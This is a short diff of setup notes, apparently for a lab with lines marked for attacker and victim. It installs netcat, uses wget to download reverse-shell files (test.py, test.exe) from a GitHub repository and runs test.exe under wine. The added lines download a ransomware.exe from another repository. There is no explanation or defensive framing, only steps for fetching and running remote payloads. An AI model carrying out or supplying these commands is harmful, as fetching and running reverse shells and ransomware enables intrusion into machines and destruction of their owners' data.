@@ -7,6 +7,9 @@ A/V apt install netcat-traditional
  V  wget https://raw.githubusercontent.com/LucasDANQUIGNY/Reverse-Shell/main/test.py
  V  wget https://raw.githubusercontent.com/LucasDANQUIGNY/Reverse-Shell/main/test.exe
 
+ V  apt install git -y
+ V  wget https://raw.githubusercontent.com/LucasDANQUIGNY/Public_Repo/main/ransomware/ransomware.exe
+
  V  apt install wine
  V  wine test.exe
 
